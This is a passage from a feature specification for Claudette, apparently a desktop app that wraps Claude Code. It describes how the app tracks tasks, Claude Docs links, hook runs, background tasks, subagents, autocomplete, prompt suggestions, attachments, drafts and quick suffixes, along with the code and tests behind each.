- **When a turn ends.** After a turn that changed the task list ends normally (reading it with `TaskList` or `TaskGet` doesn't count), a row before the turn's last cards says where the list stands: *"✓ All 7 tasks done · 23m"*, timed from the first task's start (or, without one, its adding) to the turn's end, or *"4 of 7 tasks left · Next: #4 Run the migration"* (*"In progress: …"* while one still is) with **Continue**, which sends *"Carry on with the tasks that are left."* as the user's message. **Continue** is offered on the latest such row only, until the next turn starts. The **Finished** notification starts with the same words ([§10](#10-notifications)). Only live, as the turn's cards are.
- **Progress elsewhere.**
  - **The status line**, under the composer: at its right, *"Drafting the plan…"* while Claude writes one, *"3 of 7 tasks · Running the tests"* while tasks are left (the one in progress, in its active form), and *"All 7 tasks done"* once they are. With no tasks, *"Following the plan"* once a plan is approved or a reply is shown as the plan. Clicking it opens the Tasks page.
  - **The tab's row** ([§4](#sidebar)): while tasks are left, a *3/7* badge at the right of the second line, before the branch, whose tip names the one in progress (*"3 of 7 tasks done · Now: Running the tests"*); clicking it selects the tab and opens the Tasks page. While the tab works with a task in progress, the second line says the task (*"Running the tests"*) instead of the model and effort, which come back when the turn ends. **Show task progress** (Settings → Conversation, under Tab rows, on by default) turns both off.
  - **The info card** ([§4](#4-tabs--sessions)): a *Tasks* row, *"3 of 7 done · Now: Running the tests"*.
- **Giving Claude the tools.** Since 2.1.268, Claude Code gives its task-tracking tools only to Opus 4.7, Sonnet 4.6, Haiku 4.5 and older models: newer ones keep track of their work without a written list, so they make no tasks and only the plan shows here. Settings → Claude Code → **Give Claude a task list** (on by default) starts tabs with `CLAUDE_CODE_ENABLE_TODO_TOOLS=1`, which gives every model the tools, at the cost of the room their definitions and reminders take in the context. Off, Claudette leaves the variable as the user's environment has it. It applies to tabs started after the change.
- Tasks are the session's, so a subagent's `TaskCreate` and `TaskUpdate` calls land here too; a subagent's own `TodoWrite` list stays a card in its group. The calls themselves show here rather than as cards, as do `TaskList` and `TaskGet`, whose results fill in what the calls didn't show. A restored tab's tasks are dated by their transcript entries.
- **The list Claude sees.** Claude Code keeps the session's list in a folder of its own, `tasks/<name>` in its config folder, named for the session, or for `CLAUDE_CODE_TASK_LIST_ID` when the environment `claude` starts with or its settings files' `env` set it, which shares one list between sessions (the folder is documented, its files aren't: a `<number>.json` for each task, checked against 2.1.301). After each answer to a Task tool's call, and whenever the folder changes, Claudette reads it, and the list here becomes what's there: a task finished, added or deleted there, by another session sharing the list too, is here, and a restored tab shows the list as it is now. A read waits until Claude's calls have been answered, and a task whose change is still to be answered keeps it. A folder without the newest task Claude made (Claude Code writes a task's file before answering with its number) isn't where Claude Code keeps this list, which it can keep elsewhere, or under an agent team's name: it's left alone until the session changes. Then, and while there's no folder, the calls keep the list:
  - A number means the newest task that has it.
  - Claude Code numbers a new task above every task in its list. A new task with the number of a task here means Claude Code started its list over, as a long session saw when Claude Code changed version, so the tasks from before it go.
  - A `TaskList` result is the whole list: a task it hasn't got is gone.
- The command palette's **Show tasks** shows this window. `/clear` empties it, versions and all, as it does the pinned list.
- **How it's built.** `Conversation/TodoList.cs` keeps the tasks, the plan's versions (`PlanVersion`), the draft and the suggestion; `ConversationBuilder` feeds it, adds the rows where tasks start (`TaskStartItem`) and the row at a turn's end (`TasksSummaryItem`), and decides which task each change and call counts toward; `TabViewModel.ToolWindows.cs` and `TabViewModel.Tasks.cs` have the commands and the row's badge. Core's `Sessions/ClaudeTasks.cs` reads Claude Code's tasks folder (`ClaudeTaskFolder`) and its tasks (`ClaudeTask`), and `Conversation/TodoListFolder.cs` follows the tab's folder for `TabViewModel.Tasks.cs`. `TasksPlanTests`, `TaskBoardTests` and `TaskProgressTests` (the view model), `TaskFolderTests` and `ClaudeTaskFolderTests` (Claude Code's folder), `PlanRealCliTests` (the draft, with the real `claude` in Plan mode against the mock), `TasksAndMcpPagesUiTests` and `TaskProgressUiTests` (the views).

### Claude Docs

✅ Built 2026-10-11. Claude can write a doc on claude.ai with claude.ai's **Claude Docs** connector (an MCP connector from the user's claude.ai account, its tools `mcp__claude_ai_Claude_Docs__…`): a task list to work through, a report, notes to keep. The doc lives on claude.ai, where the user can read, edit and comment on it. The connector expects the app to open it beside the conversation with an Artifact tool. Claude Code run by Claudette has none, so the connector tells Claude to give the link once, in a line part-way through the turn, and Claude's last reply names the doc without it. Claudette keeps track of the docs instead:

- **On the call's card.** A call that made a doc, edited it or commented on it has a link under its header, in place of the first line of the connector's reply (its JSON): *Created "Enemies: your task list"*, *Edited "…"*, *Commented on "…"*, or *Edited a Claude Doc* for a doc whose title the session hasn't seen. It opens the doc in the browser.
- **As the turn ends.** A row for each doc the turn made or changed, once per doc, as the most it did (made it, else edited it, else commented on it): the doc's icon, *Created "Enemies: your task list"* and **Open**. It comes however the turn ended, since a stopped turn's doc is there to open too. Only live, as the turn's cards are.
- **On the Tasks page** ([Tasks](#tasks)), which a doc alone brings: a **Docs** section above the plan with each doc's title, which opens it, and *Created 14:02 · edited 14:30*. The page's tab says *A Claude Doc* (or *2 Claude Docs*) in its tip when that's all the page has. A restored tab lists them from its transcript, and `/clear` empties them with the rest of the page.
- **How it's read.** Every call names its doc as a `container` of kind `project`: a call that makes one has `create.name`, the title, and the rest have its `id`. A reply's first line is JSON with a `verdict` (only `allow` counts) and `frame`, the doc's id (`slug`) and address (`artifactUrl`, else `url`; only an http(s) one is kept). An edit's reply has no address, so a doc Claude only edits isn't listed until a reply says where it is, as a comment's does. Other tools (`guide`, `read`) change nothing. The connector's calls are known by the prefix Claude Code gives claude.ai's connectors (`mcp__claude_ai_`) and the input's shape, not by the connector's name. None of this is documented: it's how the connector answered through 2.1.284.
- Find looks through the links and rows ([Find](#find)), and an export keeps the link on the call's line ([Export](#export)).
- **How it's built.** `Docs/ClaudeDocCall` in Core reads a call and its reply. `ConversationBuilder` puts the link on the card (`ToolUseItem.Doc`), the doc on the Tasks page (`TodoList.Docs.cs`: `DocRow`) and the rows at the turn's end (`DocSummaryItem`). `ClaudeDocCallTests`, `ConversationBuilderTests`, `ConversationExportTests` and `TasksAndMcpPagesUiTests`; `fake-claude`'s `DOC` prompt shows it without an account.

### Hook runs

The user's and project's hooks ([Claude Code hooks](https://code.claude.com/docs/en/hooks)) run inside Claude Code, which reports each run (`--include-hook-events`: `system/hook_started`, `hook_progress` and `hook_response`).

- A hook that fails, or prints something while it runs, gets a compact row in the conversation: *"PreToolUse hook (Bash) · failed (exit code 2)"*. Expanding it shows what it printed, its output or else its standard output and error, up to 20,000 characters. A failed one opens by itself.
- The rest run quietly. **Show every hook run** (Settings → Conversation, off by default) gives every run a row, from its start (*running…*) to how it ended (*done*, *failed*, *cancelled*).
- Hook names and output are the hook's own text, shown as text. Find looks through them, and an export keeps the failed ones.

### Notices

Claude Code's own warnings and notices come as `system/informational` messages: a model fallback (since 2.1.286 also when it shrinks the context window from 1M to 200K tokens), a hook's message to the user (`systemMessage`, each line starting with the hook's name, such as *"PostToolUse:Bash says: …"*), and a `UserPromptSubmit` hook's reason for blocking a prompt.

- Each is a note in the conversation, as text: a warning (`level` `warning`) in the warning color, the rest (`info`, `notice`, `suggestion`, and a level Claudette doesn't know) as plain notes. An empty one is skipped.
- Find looks through them as through other notes.

### Running tasks

Claude Code keeps some work going after a turn ends, and its own UIs count it (*"1 running task"*). So does Claudette.

- **What counts.** What Claude Code reports with `system/task_started` and runs in the background:
  - a shell command run with `run_in_background`, or moved there later;
  - a background subagent (a foreground one is part of the turn, and only on the Agents page, [§18](#agent-map));
  - a Monitor watch;
  - a remote agent or a workflow, and a kind Claudette doesn't know yet.
  - Not a foreground command or subagent, and not Claude Code's own work (`ambient: true`), which the Agent SDK says to leave out of activity indicators.
- **How it's read.**
  - `task_started` gives the task's id, its tool call (`tool_use_id`), `task_type`, `description` and `is_backgrounded`.
  - `local_bash` covers both commands and Monitor watches, so the tool call's name tells them apart. A Monitor always counts. Without `is_backgrounded`, the call's own `run_in_background` decides.
  - A `task_updated` patch with `is_backgrounded: true` moves a foreground task to the background, and a new `description` renames it.
  - A subagent follows its node on the agent map, so the two agree: one whose `Agent` call returns `async_launched` counts from then on, and one the map sees end has ended.
  - A task runs until a `task_updated` or `task_notification` with `completed`, `failed`, `stopped` or `killed`. Other statuses (`pending`, `running`, or ones Claude Code adds later) leave it running.
  - When the tab's `claude` exits or is restarted, its tasks go with it and the count clears. `/clear` keeps them, without their cards.
  - Claude Code also sends `background_tasks_changed` with the whole live set. Claudette doesn't use it yet: the Agent SDK says not to pair it with the per-task messages, and nothing recorded shows it from 2.1.284.
- **The chip.** In the composer bar, next to **Agents**: a pulsing dot and *"1 running task"* or *"3 running tasks"*. It leaves subagents out: the **Agents** button counts them, and the Agents page stops them, each row with its own **■** ([§18](#agent-map)). Counting them in both took room the bar doesn't have. It's hidden at none, so a tab whose only background work is subagents has just the **Agents** button. Clicking it lists the tasks, oldest first:
  - an icon for the kind (a prompt for a command, a pulse for a Monitor, the agents icon for a workflow, a cloud for a remote agent);
  - the description, else the command, with the kind under it (*Shell command*, *Monitor*, *Remote agent*, *Workflow*, *Task*);
  - how long it's been running, from the app's clock, ticking every second while the list is open;
  - **Stop**, after a confirmation, through `stop_task` as the process monitor and the agent map stop tasks. The task stays listed until Claude Code says it ended.
  - Clicking a task scrolls to the card of the call that started it and opens it, expanding the subagent groups it's in. Its tooltip has the command in full.
- **Elsewhere.** The tab's row counts them all once the turn is over, subagents too, since nothing else on the row says work goes on; its tip tells them apart (*"1 agent and 2 tasks still running"*, [§4](#sidebar)). The info card's *Running tasks* row lists those the chip does, beside its own *Agents* row ([§4](#4-tabs--sessions)). The process monitor's **Stop** finds a process's task through the same record ([§4](#process-monitor)).
- **Code and tests.** `Conversation/RunningTasks.cs`, kept by `ConversationBuilder` beside the agent map; `TabViewModel.Tasks.cs`. `RunningTasksTests` (the view model) and `RunningTasksUiTests` (the chip, its list, and the row's count in both styles and densities).

### Subagents

✅ Built 2026-10-17.

Claude can hand part of its work to a subagent, which runs inside the same session with its own prompt and tool calls and hands a report back; the agent map shows them all as a tree ([§18](#agent-map)). Two settings change where their work shows and whether Claude uses them.

- **Where their work shows.** Settings → Conversation → **Show subagents' work**:
  - **Under the tab in the sidebar** (the default): each subagent has a row under its tab, as a thread's sub-threads sit under their thread, and its card in the conversation is one line (its status, type, task, time and result line) whose click shows its work in the tab.
  - **In the conversation**: each subagent is a card whose line opens its own cards under it, with no row in the sidebar.
  - It changes only what's shown, so it applies at once, to every tab, restored ones included. The rows are the default because they show a subagent's work at a glance, and as it runs, without its cards filling the conversation.
- **Its row** ([§4](#sidebar)), under the tab's, before its project runs:
  - The agent map's status glyph (the busy dot, `!` while it waits on the user, a green dot, ✕, ■), the agents icon, its task and its running time; under them its type and what it's doing, or how it ended, as the agent map's second line has it.
  - A nested subagent sits under the one that started it, 12 pixels further in, in the tree's order.
  - **■** stops it while it can be stopped (**Stop subagent…**, [§18](#agent-map)); once it and everything it started have finished, **×** dismisses it. Its right-click menu has **Show its work**, **Stop subagent…**, **Dismiss** and **Dismiss earlier subagents**.
  - **From an earlier turn.** A subagent is part of the work under way while it's from the latest message that started work (the user's, a thread's, a sub-thread's report; not a check-in or a continue), or still running: a background one included, since its result starts a turn of its own. One that has finished, everything it started too, and is from before that message is dimmed, and its tip adds *"From an earlier turn"*. **Dismiss earlier subagents** takes them all off.
  - Rows stay until they're dismissed, or `/clear` takes the subagents away. A restored tab brings back rows only for its last exchange's subagents: a long session's would fill the sidebar, and the earlier ones are on the Agents page and their cards. Dismissing isn't saved.
  - The rail doesn't list them, as it doesn't list project runs.
  - Collapsing the tab folds them away under its row, with its project runs; one that starts waiting on you, or whose work is shown, opens it again ([§4](#sidebar), "Collapsing a tab").
- **Its work, in the tab.** Selecting a row selects the tab and shows the subagent's work in place of the conversation:
  - Over it, a header: **← ‹the tab's name›** back to the conversation; its status, its task, and its type in a small badge with the agents icon; the agent map's type, model, running time, tool calls and tokens; and **The prompt it was given**, one click away, as Markdown.
  - Its cards, as its group in the conversation holds them, following new output, with **Jump to latest**, marks in the scroll bar and F3 and F4 of its own; then what it handed back, as a card, *Handed back to Claude*. Find looks through it rather than the conversation.
  - In place of the composer, a bar: a permission prompt the subagent waits on, answered there as in the conversation; *"A subagent's work, read-only. Claude Code doesn't let you write to a subagent…"*; **Message it through Claude** when Claude can reach it; **Stop subagent…** while it runs; and **Back to the conversation**.
  - The conversation keeps its place under it, so going back finds it as it was. The tab's own row, **Back to the conversation** and `Esc` go back.
  - The row is picked out while its tab is in front and shows its work.
  - The Agents page's nodes, and a subagent card's line, show its work; so does going to a card inside a subagent's work, from the process monitor or Find: the work of the subagent whose own card it is.
- **Why read-only.** In a `-p` session like Claudette's, Claude Code has no documented way for the user to write to a subagent: its terminal can type into a subagent's transcript, but neither the stream-json input nor the Agent SDK can. Claude can, with `SendMessage` and the subagent's agent ID, which wakes a finished one in the background or reaches a running one. So **Message it through Claude** goes back to the conversation with the subagent `@`-mentioned at the start of the composer, which tells Claude how to reach it ([Autocomplete](#autocomplete)), and the message is a turn of the main agent's. It's offered while the subagent runs, and once it's finished unless it's Explore or Plan (built in and one-shot, so they can't be resumed) or the user stopped it.
- **Whether Claude uses them.** Settings → Tabs → **Subagents**, and the same in Tab settings… for one tab ([§14](#per-tab-overrides)):
  - **Claude decides** (the default): as Claude Code has it.
  - **Discourage them**: Claude Code starts with a note (`--append-system-prompt`, after the project's and Perforce's notes): do the work yourself, and use a subagent only when the user asks for one. It lasts through compaction, and costs a few tokens, read from the prompt cache.
  - **Don't allow them**: a note saying it can't, and Claudette's PreToolUse hook on `Agent` (and `Task`, its older name), which every tab registers at `initialize` as it does the threads' ([§13](#integration-with-claude-code), "Hook callbacks"), answers deny. Claude Code doesn't start the subagent, and Claude reads why as the call's result: *"Claudette didn't start this subagent: subagents are turned off for this tab in Claudette's settings. Do this work yourself…"*. The call's card says *"Not started: subagents are turned off for this tab"* with a muted dot, and it has no row, no node on the Agents page and no work to show.
  - **Changing it.** The hook reads the setting at each call, so it applies at once, in a running tab too. A running tab tells Claude with the user's next message, as a thread's note goes ([§18](#threads)): *"Told Claude to avoid subagents"*, *"Told Claude it can't use subagents"* or *"Told Claude it can use subagents again"* under the message's card, with the note as its tip. Not after a slash command, and taken back with its message, the next one carries it. The tab keeps what Claude was last told, through restarts; a tab whose Claude Code starts with the note needs none.
  - **Not covered.** Workflows and skills that fork, which run agents through tools of their own.
  - **Why not a note on every message.** A quick suffix kept on the tab would do it ([Quick suffixes](#quick-suffixes)), but it costs tokens with every message and shows in each one; the note at the start says it once, and the hook makes it hold. **Why not `--disallowedTools Agent`.** It removes the tool, but only from a tab started after the change, and the user couldn't have a subagent even by asking; the hook applies at once, and **Discourage them** leaves asking open. `CLAUDE_CODE_DISABLE_EXPLORE_PLAN_AGENTS` would remove only Explore and Plan.
- **How it works.** Checked against Claude Code 2.1.284 with the mock Messages API: the hook is called for every `Agent` call, a subagent's own included; its deny stops the call before a subagent starts, with no `task_started`, and Claude reads `PreToolUse:Agent hook error: ` and the reason as the call's error result. The conversation finds a refused call by the reason's own text. The note is in the requests' system prompt.
- **Code.** `Claudette.Core/Subagents/SubagentMessages` (everything Claude reads about subagents). In the app, `TabViewModel.Subagents.cs` (the setting, the hook and the note; the rows, each a `SubagentRowViewModel`; the work shown, `ViewedAgent`), the agent map's `Exchange`, `IsEarlier` and `Remove` (a refused call), and `TabView`'s second list, beside the conversation's.
- **Tests.** `SubagentMessagesTests` in Core; `SubagentTests` in the app (the rows and their nesting, earlier and dismissed rows, a restored tab, showing a subagent's work and going back, Find, a prompt answered from it, messaging it, switching the setting, the hook and the notes); `SubagentUiTests` (the rows, the work with its header and bar, the one-line card); `SubagentRealCliTests` (a fan-out's rows and a subagent's work, and **Don't allow them**, with the real CLI); `RealCliTests` (the hook and the note).

### Autocomplete

- **Slash commands.** Typing `/` at the start of a message lists the session's commands: built-in, user, project, plugin and MCP ones. Only the start counts, because that's the only place Claude Code runs a command.
  - Names, argument hints and descriptions come from the `commands` of the `initialize` reply. A `system/commands_changed` message replaces them when the list changes mid-session, for example when Claude Code finds skills in a subfolder.
  - Each turn's `system/init` lists the commands the session accepts (`slash_commands`). A command only it names is offered without a description.
  - Terminal-bound commands (`terminal_slash_commands`, such as `doctor`) and internal ones (a leading `__`) aren't offered.
  - Filtering ignores case. Names that start with what's typed come first (an exact name first of all), then aliases (`/reset` finds `/clear`), then names that contain it, then, from three letters on, descriptions.
  - Picking one replaces the word with `/name ` and closes the list. Claude Code runs the command when the message is sent, as in the terminal.
- **Files.** Typing `@` at the start of a word lists the working folder's files and folders, and the tab's extra folders' ([§4](#4-tabs--sessions), "Extra folders").
  - In a git repository the list is `git ls-files --cached --others --exclude-standard`, so `.gitignore` is respected.
  - Elsewhere it's a breadth-first walk of the folder that skips `.git`, `.hg`, `.svn`, `node_modules`, `bin`, `obj`, `.vs`, `.idea`, `__pycache__` and `.venv`, and stops at 20,000 entries or 16 levels deep.
  - The list is cached per folder, one for all the tabs in it, and kept up to 100,000 files (folders don't count against it). It's refreshed when it's more than 15 seconds old and after each turn, and the old list is used while the new one loads.
  - Matching runs off the UI thread, and a keystroke stops a match the one before started rather than letting it finish.
  - Matching ignores case. Best first: a name that starts with what's typed, a path that does (`src/de` finds `src/deep/`), a path segment that does, a name or path that contains it, then its letters in order, preferring the starts of words (`tvm` finds `TabViewModel.cs`). Ties go to shallower, then shorter, paths. With nothing typed, the top of the folder is listed, folders first.
  - Picking a file inserts `@path/to/file ` relative to the working folder. Picking a folder inserts `@folder/` and lists what's in it. A path with spaces is quoted: `@"docs/my notes.md"`.
  - **Extra folders.** Each has a list of its own, made and kept as the working folder's is, and shared with the tabs working in it. Their matches join the working folder's, best first, the working folder's first on a tie, each with its folder's name before its path (*shared/lib/*). With nothing typed, each extra folder itself comes after the top of the working folder, as *Extra folder*. Picking one inserts its full path, since it isn't in the working folder: `@D:/Shared/lib/helper.cs`.
- **Typing a path.** Once what's typed after `@` has a slash, the folder up to its last slash is read from disk, and its entries whose names start with what follows are listed, folders first, then files, by name.
  - **Outside the working folder** is a path that starts with a drive or a share on Windows (`C:\Work\`, `D:/`, `\\server\share\`), with `/` on macOS and Linux, with `~/` for the home folder, or with `../`. Its folder's entries are all the list has: no sessions, and nothing from the working folder. The header names the folder (*D:/Work/Game/*), and picking an entry inserts its full path with forward slashes, `~` and `..` worked out, so it means the same wherever Claude Code is: `@C:/Users/sam/notes.md`. A folder that isn't there says *No such folder*, and an empty one *Nothing in this folder*.
  - **Inside it** (`@Source/`, `@./`), the folder's own entries come first, then the matches as above, without the ones already listed. They include what the list leaves out: what git ignores (outside a repository, the folders the walk skips), dimmed, as the Project Files explorer has them ([§18](#project-files)). Git is only asked about the entries the folder's list doesn't have, since everything it has isn't ignored, and a folder git ignores has nothing but ignored entries.
  - **Reading.** A folder is read when the typed path reaches it, not with each letter, off the UI thread, and kept for 10 seconds, so typing a name in it never reads it again; the app keeps the last 16. While a folder outside is read for the first time, the list says *Listing D:/Work/…*, so a slow or network drive never holds up the composer. Reading one takes about a millisecond for a folder of a few hundred entries, and under 10 for one of 5,000.
  - On Windows a lone leading slash would be the current drive's root, which isn't what anyone means, so `@/` stays in the working folder.
- **Sessions and agents.** The same `@` list starts with the ones Claude can message with `SendMessage`, up to eight, matched by name (a name that starts with what's typed, then one with a word that does, then one that contains it), and the header reads *Sessions and files*:
  - A thread's sub-threads, by the names it knows them by ([§18](#threads)), marked *Sub-thread*.
  - The sessions in Claudette's other tabs, by the tab's name, marked *Tab*.
  - The other Claude Code sessions on this machine, a terminal's or another app's, by their own names, with their folder: *Session · C:\work\api*. They come from Claude Code's sessions folder ([§13](#integration-with-claude-code), "Session naming"), read again as each mention starts. Claudette's utility session isn't one.
  - The tab's subagents, newest first, by their task, with their type: *Subagent · Explore*. `SendMessage` reaches one by its agent ID.
  - Names that clash get `(2)`, as sub-threads' do. Picking one inserts `@name ` or `@"a name" `.
  - **Sending.** A mention of one of them (`@name` or `@"a name"` at the start of a word, ignoring case, with punctuation after an unquoted one) reaches Claude without its `@`, which Claude Code would take for a file. A note after the message says who each is and what to send to: *[Claudette] "Art page" in this message is another Claude Code session on this machine, open in another of Claudette's tabs. To message it, call SendMessage with to: "Art page".* (a list for several). The card keeps what was typed, with *"Told Claude how to reach Art page"* under it and the note as its tip, as the threads' note does. Not after a slash command.
  - **By session ID.** A session's ID in a message names it too: a tab's (what its menu's **Copy session ID** gives), a sub-thread's or another session's on this machine (from Claude Code's sessions folder), as a word of its own, ignoring case. `SendMessage` doesn't take an ID as its `to`, only the name (checked against 2.1.284: Claude otherwise looks the ID up with `ListAgents` first), so the ID stays in the message and the same note gives the name: *[Claudette] 66790aac-… in this message is the session ID of "Art page", another Claude Code session on this machine, open in another of Claudette's tabs. To message it, call SendMessage with to: "Art page".* This tab's own ID names nobody, and a session named with `@` as well goes by its name.
- **Keys.** The list opens above the composer, and the text box keeps focus.
  - `Up` and `Down` move through it, `Enter` or `Tab` picks, and clicking an entry picks it.
  - `Esc` closes it (without stopping Claude), and it stays closed while the caret is in that command or mention.
  - `Enter` still sends when the list has nothing to pick, or when what's typed is already the highlighted entry, such as `/compact` in full.
- **What Claude Code does with `@path`.** Checked against 2.1.284:
  - When the message is sent, Claude Code reads each mentioned file with its Read tool and gives Claude the content as context. A folder gets a listing, and an image file becomes an image. Absolute paths outside the folder work too, and none of this asks for permission.
  - A file that was already read and hasn't changed isn't attached again. A path that doesn't exist is left as text, and so is a binary file it can't read.
  - It only reads mentions in the message's last content block, and only when that block is text. Claudette sends the text after any images for this reason.
  - Setting `client_composed` on a message turns this off, along with running slash commands. Claudette doesn't set it.
  - A full path outside the folder is read too, with forward slashes on Windows and quoted when it has spaces: `@"C:/a folder/notes.txt"` (checked against 2.1.284).
- **How it's built.** Core's `Composer/`: `ProjectFileIndex` lists a folder's files, `PathMatcher` ranks them (`MatchScored` keeps the scores, for ranking several folders' together), `MentionFolder` reads the folder a typed path names, and `MentionFolderReader` (one in `AppServices`) reads it with `ProjectFiles/FolderListing` and marks what's ignored. `ComposerCompletions` puts them together from `TabViewModel.MentionFiles`. Tests: `FileMentionTests` and `MentionFolderTests` (Core), `ComposerTests` (the view model), `MainWindowTests` (the popup, with the dimmed rows) and `RealCliTests` (the real `claude` reading a full path outside the folder).

### Prompt suggestions

After Claude replies, Claude Code can predict what the user will send next ([Prompt suggestions](https://code.claude.com/docs/en/interactive-mode#prompt-suggestions)), which the terminal shows as gray text in the empty input. Claudette shows it the same way.

- **Off by default.** Settings → Conversation → **Suggest my next prompt** starts tabs with `--prompt-suggestions`. Each suggestion is a short extra model call on the conversation (mostly cache reads), which counts toward usage, hence off. It applies to tabs started after the change. Turned off, no suggestion shows, though a running session goes on making them until it restarts.
- **How it arrives.** A `prompt_suggestion` message with the `suggestion`, straight after the turn's `result` (checked against 2.1.284, in the long-running stream-json session). Claude Code makes none for some turns: a conversation's first, one that ended in an error, in Plan mode, near the usage limit, with a cold prompt cache. Its own switches still apply with the flag: `promptSuggestionEnabled: false` in its settings (the **Prompt suggestions** toggle in `/config`), or `CLAUDE_CODE_ENABLE_PROMPT_SUGGESTION=false`, turns them off. Nonessential traffic being off doesn't.
- **Where it shows.** As the composer's placeholder, in place of *"Message Claude…  (Enter to send, …)"*: *"run the tests  (Tab to use)"*.
- **Taking it.** `Tab` or `→` in the empty composer puts it in the box with the caret at its end, to send with `Enter` or change first, as in the terminal. `Enter` on the empty box doesn't send it.
- **When it goes.** Typing anything (for good: emptying the box again doesn't bring it back), a message sent, any turn starting (a check-in, the Claude app, a thread), `/clear`, and Claude Code exiting. One that arrives while something is typed, or after a message has gone, isn't shown. It isn't saved with the tab.
- **How it's built.** `PromptSuggestionMessage` and the `PromptSuggested` event in Core; `TabViewModel.Composer.cs` keeps the suggestion and the placeholder, and `ComposerView` takes the keys. `PromptSuggestionTests` (the view model), `PromptSuggestionUiTests` (the placeholder and `Tab`, rendered) and `RealCliTests` (the real `claude` against the mock, which answers Claude Code's suggestion request with *run the tests*). `fake-claude`'s `SUGGEST <text>` shows it without an account.

### Attachments

- Images and files can be dropped on the composer, pasted into it, or picked with the attach button (the paper clip).
- **Images.** PNG, JPEG, GIF and WebP, recognized by their first bytes.
  - They show as thumbnails above the text box, 56 px high and at most 120 px wide, each with a `×` (**Remove image**) to remove it. A thumbnail is decoded at thumbnail size, so a large image doesn't cost its full size to show.
  - They're sent as base64 `image` content blocks in the `user` message, before the text. A message can be only images: **Send** is enabled with just an image attached. Sending clears them from the composer.
  - Each can be up to 20 MB, and a message can have up to 20. Past either limit, a note under the composer says why: *"Pasted image is 20.1 MB; images can be up to 20 MB."* or *"A message can have up to 20 images."* Sizes are rounded up, so an image just over the limit never reads as the limit itself.
  - Claude Code scales images down itself before they reach the API: 2.1.284 fits them in 2000 px and re-encodes large ones as JPEG: a 20 MB PNG reaches the API under 5 MB. So Claudette sends them as they are, and the API's own size limits don't apply to what's attached.
- **Other files and folders** become `@path` mentions, inserted at the caret. The path is relative to the working folder when the file is in it, and the full path otherwise. Claude Code reads them when the message is sent (see [Autocomplete](#autocomplete)), which covers text, PDFs and notebooks, and the message still says what was attached.
  - Binary files Claude can't read are refused with a note under the composer, rather than becoming a mention Claude Code would silently drop. A file is treated as binary when its first 8 KB contain a zero byte, except PDFs.
  - Images over 20 MB and other image formats (such as BMP) are refused the same way.
- **Pasting.** `Ctrl+V` or `Shift+Insert` (`Cmd+V` on macOS), or **Paste** on the text box's right-click menu.
  - Copied files are attached.
  - Otherwise, text on the clipboard pastes as text, even when an image comes with it, since apps often add a picture of the same text. Text that's only white space doesn't count: some apps add a line break to a copied picture.
  - An image on its own, such as a screenshot, is attached. Claudette reads it the way each OS puts one on the clipboard (Avalonia does this; checked against 12.1.3's source):
    - Windows: `PNG` or `image/png`, else a bitmap (`CF_DIB`, `CF_DIBV5` or `CF_BITMAP`), which is what Snipping Tool and `Win+Shift+S` put there.
    - macOS: `public.png`, else `public.tiff` or `public.jpeg`, converted to PNG.
    - Linux: `image/png` or `image/jpeg`.
  - A pasted or dropped picture is sent as PNG. When the PNG would be over 20 MB, as a photo-like screenshot of a 5K screen can be, it's sent as JPEG at quality 90 instead, about a tenth of the size.
- **Large pastes.** Text over 32 KB (in UTF-8), such as a log, isn't put in the box, where it would make typing slow and the message hard to edit around. It's kept as an attachment instead: a chip above the box, *"Pasted text · 1,204 lines · 48 KB"*, whose tooltip shows its first 12 lines, with a `×` (**Remove pasted text**).
  - It's sent after what's typed, each paste after a blank line, as one text: Claude reads it in full, and an `@path` in what's typed is still read ([Autocomplete](#autocomplete)). A message can be only pastes.
  - `Ctrl/Cmd+Shift+V` pastes the clipboard's text into the box as it is, however long.
  - A message taken back ([Queued messages](#queued-messages)) puts its pastes back as attachments. **Edit and resend** puts the whole message in the box, since its transcript has it as one text.
- **In the conversation.** A sent message shows its images as thumbnails above its text. Claude Code stores them in the transcript, so a restored tab shows them too. A long message, over 4,000 characters or 40 lines, shows its start, with **Show all (48 KB)**, as a long tool output does; Find opens it when the match is in what's hidden.
- **Drafts.** Attached images and pastes stay with the message until it's sent.
  - A message sent while Claude Code needs a sign-in waits with its images, and they go with it after the sign-in ([§11](#signing-in)).
  - Quitting keeps them with the tab's draft ([below](#drafts-and-the-stash)), and so does restarting into a new build, in `restart.json`, and taking the tabs back when the new build doesn't start ([§9](#working-on-claudette)).

### Drafts and the stash

What's typed isn't lost by quitting, and can be put aside.

- **Kept with the tab.** Each tab's unsent message (its text, one-off quick suffixes, attached images and large pastes) is written a second after it last changed, and when the tab closes, to `drafts/tab-<id>.json` in the data folder. A restored tab has it back in its composer.
  - Closing a tab, rather than quitting, deletes its draft. So does sending, which empties it.
  - At launch, the drafts of tabs that weren't restored (unpinned ones, with **Also restore unpinned tabs when Claudette starts** off) are deleted.
  - After a restart into a new build, the snapshot's draft wins, as before ([§9](#working-on-claudette)); writes stop once the new build owns the files.
- **Stash.** **Stash the message** (`Ctrl/Cmd+S`, rebindable, and in the command palette while there's something typed) takes the whole draft out of the composer and keeps it in the stash, which every tab shares. It's for a message that belongs somewhere else, or later.
  - While the stash has anything, the composer bar has **Stashed (2) ▾** after **Suffixes**. Its menu lists them newest first: the first line (or what's attached, *"2 images"*), and the folder it was written in with how long ago (*"api · 5 min ago"*), its tooltip the whole text.
  - Picking one takes it out of the stash and puts it in this tab's composer, ahead of anything typed, as a message taken back is. Its `×` deletes it.
  - Each entry is a file in `drafts/stash/`, so the stash outlives quitting. It belongs to this machine and doesn't sync.
- How it's built: Core's `Composer/DraftStore` reads and writes the files and never throws; the app's `Services/DraftService` writes them in order off the UI thread, and keeps the stash for the tabs (`StashChanged`); `TabViewModel.Drafts.cs` saves the tab's draft, stashes and quotes. `DraftStoreTests` (Core), `DraftsAndStashTests` (the tab).

### Quick suffixes

Saved snippets of instructions that can be added to a message in one click, such as *"Ask clarifying questions before you start."*

- **Picking one.** A **Suffixes ▾** button next to the text box opens a dropdown of saved suffixes. `Ctrl/Cmd+Shift+S` opens it from the keyboard, and the first nine entries can be picked with `1`–`9`.
- **Chips.** A picked suffix appears as a chip under the text box instead of being pasted into the text, so the message stays easy to edit. Several can be picked at once. Click a chip's `×` to remove it.
- **Check marks.** The dropdown puts a check mark beside each suffix already on the message, kept or not. Picking a checked one (by click or its number) takes it off, like its chip's `×`.
- **Sending.** When the message is sent, the suffixes are appended in the order shown, separated from the message by a blank line. The sent message in the conversation shows the full text, with the suffix part in a lighter style. Sending with only suffixes and no typed text is allowed.
